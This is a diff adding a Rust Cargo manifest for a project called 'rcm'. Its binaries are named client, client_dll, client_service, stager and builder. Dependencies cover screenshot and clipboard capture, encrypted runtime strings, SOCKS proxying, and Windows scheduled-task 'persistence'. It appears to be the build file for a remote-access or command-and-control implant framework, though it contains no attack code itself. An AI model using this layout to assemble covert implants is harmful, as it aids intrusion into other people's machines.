@@ -1,0 +1,127 @@
+[package]
+name = "rcm"
+version = "0.1.0"
+edition = "2021"
+
+[lib]
+name = "rcm"
+path = "src/lib.rs"
+
+[[bin]]
+name = "server"
+path = "src/bin/server.rs"
+
+[[bin]]
+name = "client"
+path = "src/bin/client.rs"
+
+[[bin]]
+name = "client_dll"
+path = "src/bin/client_dll.rs"
+
+[[bin]]
+name = "client_service"
+path = "src/bin/client_service.rs"
+
+[[bin]]
+name = "stager"
+path = "src/bin/stager.rs"
+
+[[bin]]
+name = "builder"
+path = "src/bin/builder.rs"
+
+[dependencies]
+# Async Core
+tokio = { version = "1", features = ["full"] }
+futures = "0.3"
+tokio-util = { version = "0.7", features = ["compat", "rt", "io"] }
+
+# Multiplexing
+yamux = "0.10"
+
+# Security & Utils
+rustls = "0.21"
+tokio-rustls = "0.24"
+rustls-pemfile = "1.0"
+ed25519-dalek = { version = "2", features = ["rand_core"] }
+rand = "0.8"
+sha2 = "0.10"
+hmac = "0.12"
+base64 = "0.21"
+hex = "0.4"
+uuid = { version = "1.4", features = ["v4"] }
+machine-uid = "0.5"
+hostname = "0.3"
+chrono = { version = "0.4", features = ["serde"] }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+rustyline = "12.0"
+argon2 = "0.5"
+subtle = "2.5"
+
+# Database
+dashmap = "5"
+rusqlite = { version = "0.29", features = ["bundled"] }
+r2d2 = "0.8"
+r2d2_sqlite = "0.22"
+
+# API Server
+axum = { version = "0.6", features = ["headers"] }
+tower = { version = "0.4", features = ["util"] }
+tower-http = { version = "0.4", features = ["auth", "cors"] }
+http = "0.2"
+reqwest = { version = "0.11", features = ["blocking", "socks", "json", "native-tls"] }
+rhai = { version = "1.16", features = ["sync"] }
+walkdir = "2"
+sys-info = "0.9"
+aes-gcm = "0.10"
+zeroize = "1"
+zip = "0.6"
+
+# Builder Dependencies
+clap = { version = "4.4", features = ["derive"] }
+anyhow = "1.0"
+thiserror = "1"
+url = "2"
+libc = "0.2"
+
+# Logging & Observability
+tracing = "0.1"
+tracing-subscriber = { version = "0.3", features = ["env-filter", "time", "local-time"] }
+tracing-appender = "0.2"
+
+# Encrypt runtime strings
+litcrypt = "0.4"
+
+# Media & Clipboard [UPDATED]
+screenshots = "0.8"
+image = "0.24"
+arboard = "3.2"  # <-- Added for Clipboard
+
+# Windows COM (ITaskService — scheduled task persistence, MSVC native builds only).
+# MinGW / cross-compiled agents (x86_64-pc-windows-gnu) fall back to schtasks.exe.
+[target.'cfg(all(target_os = "windows", target_env = "msvc"))'.dependencies]
+windows = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_System_Com",
+    "Win32_System_TaskScheduler",
+] }
+
+[build-dependencies]
+serde_json = "1.0"
+hex = "0.4"
+rand = "0.8"
+
+[dev-dependencies]
+tempfile    = "3"
+sha2        = "0.10"
+hyper       = { version = "0.14", features = ["http1","server","client"] }
+tower       = { version = "0.4", features = ["util"] }
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
